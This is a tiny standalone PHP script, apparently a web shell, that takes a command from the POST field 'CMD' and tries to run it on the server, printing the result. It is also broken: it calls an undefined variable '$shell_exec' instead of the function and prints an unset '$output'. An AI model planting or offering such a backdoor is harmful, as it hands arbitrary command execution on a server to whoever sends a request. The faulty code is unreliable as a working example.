<?php


if (!empty($_POST["CMD"])) {
    $cmd = $_POST["CMD"];
    $res = $shell_exec ($cmd);
    echo "<pre>$output</pre>"; 
} else {  
    echo "POST CMD unset";
}
    


?>